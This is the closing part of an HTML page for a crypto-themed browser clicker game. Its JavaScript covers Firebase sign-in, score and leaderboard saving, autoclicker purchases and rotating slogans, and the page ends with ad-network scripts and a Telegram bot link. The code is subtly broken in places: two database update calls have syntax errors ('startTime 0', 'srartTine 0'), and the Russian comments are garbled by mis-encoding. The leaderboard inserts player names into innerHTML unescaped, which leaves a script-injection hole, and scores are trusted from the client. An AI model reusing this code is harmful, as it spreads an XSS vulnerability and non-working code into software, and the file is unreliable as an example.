  const userName = user.displayName || `Player_${user.uid.slice(0, 8)}`;
  db.ref("leaderboard/" + user.uid).set({
    id: user.uid,
    name: userName,
    score: score,
    clickPower: clickPower,
    autoclickActive: autoclickActive,
    autoclickEndTime: autoclickEndTime,
    tempBoostActive: !!tempBoostTimeout, // –ê–∫—Ç–∏–≤–µ–Ω –ª–∏ –±—É—Å—Ç
    tempBoostEndTime: tempBoostTimeout ? autoclickEndTime : 0, // –í—Ä–µ–º—è –æ–∫–æ–Ω—á–∞–Ω–∏—è
    tempBoostOriginalClickPower: originalClickPower || clickPower, // –ò—Å—Ö–æ–¥–Ω–∞—è —Å–∏–ª–∞
    tempBoostAmount: clickPower - (originalClickPower || clickPower), // –í–µ–ª–∏—á–∏–Ω–∞ –±—É—Å—Ç–∞
    lastUpdate: Date.now()
  }).catch(error => {
    console.error("–û—à–∏–±–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è —Å—á—ë—Ç–∞:", error);
    showMessage("–ù–µ —É–¥–∞–ª–æ—Å—å —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å –ø—Ä–æ–≥—Ä–µ—Å—Å.");
  });
} 

    function buyUpgrade(type) {
      const cost = getClickPowerUpgradeCost();
      if (type === "clickPower") {
        if (clickPower >= 8) {
          showMessage("Click Power is at maximum!");
          return;
        }

        const currentLevel = parseInt(document.getElementById("playerLevel").innerText);
        if (clickPower >= 3 && currentLevel < clickPower + 1) {
          showMessage(`Reach player level ${clickPower + 1} to upgrade Click Power further!`);
          const buyButton = document.querySelector("button[onclick=\"buyUpgrade('clickPower')\"]");
          buyButton.style.animation = "shake 0.3s";
          setTimeout(() => buyButton.style.animation = "", 300);
          return;
        }

        if (score >= cost) {
          // –°–±—Ä–∞—Å—ã–≤–∞–µ–º –ø—Ä–æ–≥—Ä–µ—Å—Å –∑–∞–¥–∞—á–∏ "Thrifty Player"
      if (thriftyPlayerTimer) {
        clearInterval(thriftyPlayerTimer);
        thriftyPlayerTimer = null;
        db.ref(`tasks/${user.uid}/thriftyPlayer`).update({ progress: 0, startTime: 0 });
        }
          score -= cost;
          clickPower++;
          updateCounterDisplay();
          updateClickPowerBar();
          updateProfilePanel();
          updateClickPowerCostText();
          submitScore();
          showMessage("Click Power upgraded!");
        } else {
          showMessage("Not enough tokens for upgrade.");
        }
      } else if (type === "autoclick") {
        if (autoclickCooldown) {
          showMessage("Autoclicker on cooldown.");
          return;
        }
        if (score >= 200) {
          // –°–±—Ä–∞—Å—ã–≤–∞–µ–º –ø—Ä–æ–≥—Ä–µ—Å—Å –∑–∞–¥–∞—á–∏ "Thrifty Player"
      if (thriftyPlayerTimer) {
        clearInterval(thriftyPlayerTimer);
        thriftyPlayerTimer = null;
        db.ref(`tasks/${user.uid}/thriftyPlayer`).update({ progress: 0, startTime 0 });
        }
          score -= 200;
          updateCounterDisplay();
          showMessage("Autoclicker activated for 1 minute!");
          autoclickCooldown = true;
       //   autoclickActive = true;
          const duration = 60000;
          //autoclickEndTime = Date.now() + 60000;
          // –ó–∞–ø—É—Å–∫–∞–µ–º –∞–≤—Ç–æ–∫–ª–∏–∫–µ—Ä —Å —É—á–µ—Ç–æ–º —Å—É–º–º–∏—Ä–æ–≤–∞–Ω–∏—è –≤—Ä–µ–º–µ–Ω–∏
           startAutoclicker(duration, false);

           // –û–±–Ω–æ–≤–ª—è–µ–º –ø—Ä–æ–≥—Ä–µ—Å—Å –∑–∞–¥–∞—á–∏ "–ú–∞—Å—Ç–µ—Ä –∞–≤—Ç–æ–∫–ª–∏–∫–µ—Ä–∞"
          updateTaskProgress("autoclickerMaster", 1);

  
          updateProfilePanel();
          document.getElementById("autoclickBtn").disabled = true;

          // –û–±–Ω–æ–≤–ª—è–µ–º –ø—Ä–æ–≥—Ä–µ—Å—Å –∑–∞–¥–∞—á–∏ "–ú–∞—Å—Ç–µ—Ä –∞–≤—Ç–æ–∫–ª–∏–∫–µ—Ä–∞"
         // updateTaskProgress("autoclickerMaster", 1);
          
         // startAutoclicker(60000);
          submitScore();
        } else {
          showMessage("Not enough tokens for autoclicker.");
        }
      }
    }

  


function buyAutoclicker(minutes) {
  if (autoclickCooldown) {
    showMessage("Autoclicker on cooldown.");
    return;
  }

  const prices = {
    1: 200,
    5: 800,
    10: 1400
  };

  const cost = prices[minutes];
  if (score >= cost) {
    // –°–±—Ä–∞—Å—ã–≤–∞–µ–º –ø—Ä–æ–≥—Ä–µ—Å—Å –∑–∞–¥–∞—á–∏ "Thrifty Player"
    if (thriftyPlayerTimer) {
      clearInterval(thriftyPlayerTimer);
      thriftyPlayerTimer = null;
      db.ref(`tasks/${user.uid}/thriftyPlayer`).update({ progress: 0, srartTine 0 });
    }
    score -= cost;
    updateCounterDisplay();
    showMessage(`Autoclicker activated for ${minutes} minute(s)!`);
    autoclickCooldown = true;
  //  autoclickActive = true;
    const duration = minutes * 60000;
   // autoclickEndTime = Date.now() + duration;

    // –ó–∞–ø—É—Å–∫–∞–µ–º –∞–≤—Ç–æ–∫–ª–∏–∫–µ—Ä —Å —É—á–µ—Ç–æ–º –≤–æ–∑–º–æ–∂–Ω–æ–≥–æ —Å—É–º–º–∏—Ä–æ–≤–∞–Ω–∏—è –≤—Ä–µ–º–µ–Ω–∏
    startAutoclicker(duration, false);

    // –û–±–Ω–æ–≤–ª—è–µ–º –ø—Ä–æ–≥—Ä–µ—Å—Å –∑–∞–¥–∞—á–∏ "–ú–∞—Å—Ç–µ—Ä –∞–≤—Ç–æ–∫–ª–∏–∫–µ—Ä–∞"
    updateTaskProgress("autoclickerMaster", 1);

    if (user) {
      db.ref("leaderboard/" + user.uid).update({
        autoclickActive: true,
        autoclickEndTime: autoclickEndTime,
        score: score,
        lastUpdate: Date.now()
      }).catch(error => {
        console.error("Error saving autoclicker purchase:", error);
      });
    }

    updateProfilePanel();
   // startAutoclicker(duration);
    submitScore();
  } else {
    showMessage("Not enough tokens for autoclicker.");
  }
}
    

    function signInWithGoogle() {
      const provider = new firebase.auth.GoogleAuthProvider();
      auth.signInWithPopup(provider).then(result => {
        user = result.user;
        document.getElementById("authSection").style.display = "none";
        document.getElementById("gameSection").style.display = "block";
        loadPlayerData(user.uid);
        submitScore();
      }).catch(error => {
        showMessage("Google sign-in failed.");
        console.error(error);
      });
    }

    function signOut() {
      if (user) {
        submitScore();
      }

       // –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Ç–∞–π–º–µ—Ä –∑–∞–¥–∞—á–∏ "Thrifty Player"
      if (thriftyPlayerTimer) {
    clearInterval(thriftyPlayerTimer);
      thriftyPlayerTimer = null;
     }
      
      auth.signOut().then(() => {
        user = null;
        score = 0;
        clickPower = 1;
        autoclickEndTime = 0;
        clearInterval(autoclickInterval);
        document.getElementById("authSection").style.display = "block";
        document.getElementById("gameSection").style.display = "none";
        updateCounterDisplay();
        updateClickPowerBar();
        updateProfilePanel();
      });
    }

    auth.onAuthStateChanged(currentUser => {
      if (currentUser) {
        user = currentUser;
        document.getElementById("authSection").style.display = "none";
        document.getElementById("gameSection").style.display = "block";
        loadPlayerData(user.uid);
        checkDailyReward();
        renderTasks();
      }
    });

    db.ref("leaderboard").on("value", snapshot => {
      const data = [];
      snapshot.forEach(child => {
        const entry = child.val();
        if (entry && entry.score !== undefined && entry.name) {
          data.push({
            id: entry.id,
            name: entry.name,
            score: entry.score
          });
        }
      });

      data.sort((a, b) => b.score - a.score);

      const leaderboard = document.getElementById("leaderboard");
      leaderboard.innerHTML = "";

      if (data.length === 0) {
        leaderboard.innerHTML = "<tr><td colspan='3'>No players yet</td></tr>";
        return;
      }

      data.slice(0, 10).forEach((entry, index) => {
        leaderboard.innerHTML += `<tr><td>${index + 1}</td><td>${entry.name}</td><td>${entry.score}</td></tr>`;
      });
    }, error => {
      console.error("Error loading leaderboard:", error);
      showMessage("Failed to load leaderboard.");
    });

    setInterval(() => {
      if (user) {
        updateProfilePanel();
        if (score > 0) submitScore();
      }
    }, 1000);

    const motivationalPhrases = [
      "Click ‚Äî earn tokens.", "Sign in ‚Äî save your progress.", "Your crypto journey starts here.",
      "No account ‚Äî no profit!", "Log in and turn clicks into income!", "The first tokens are always the most valuable.",
      "Top farmers are waiting for you!", "Level up ‚Äî earn even more tokens!", "Crypto wealth starts with a single click.",
      "Skip signing in ‚Äî miss the rewards!"
    ];

    let motiveIndex = 0;
    const motiveElement = document.getElementById("motiveText");

    setInterval(() => {
      motiveElement.style.opacity = 0;
      setTimeout(() => {
        motiveIndex = (motiveIndex + 1) % motivationalPhrases.length;
        motiveElement.innerText = motivationalPhrases[motiveIndex];
        motiveElement.style.opacity = 1;
      }, 500);
    }, 3000);
  </script>

  <script async src="https://www.googletagmanager.com/gtag/js?id=G-G76GTQQKG0"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());
    gtag('config', 'G-G76GTQQKG0');
  </script>

 <div class="ad-container">
    <script type="text/javascript">
      atOptions = {
        'key': '37256add668a0f644adfae7b41a567a3',
        'format': 'iframe',
        'height': 90,
        'width': 728,
        'params': {}
      };
    </script>
    <script type="text/javascript" src="//www.highperformanceformat.com/37256add668a0f644adfae7b41a567a3/invoke.js"></script>
  </div> 

  <iframe data-aa='2393397' src='//ad.a-ads.com/2393397?size=728x90' style='width:728px; height:90px; border:0px; padding:0; overflow:hidden; background-color: transparent;'></iframe>

  <div style="text-align: center; margin: 20px 0;">
    <a href="https://t.me/rslite_bot/rsl_app?startapp=RZ8CSrP" target="_blank" rel="noopener" style="color: #00ffa6; font-size: 38px; font-weight: bold; text-decoration: none; text-shadow: 0 0 8px #00c3ff;">
      Free Game and Bonus
    </a>
  </div>
</body>
</html>
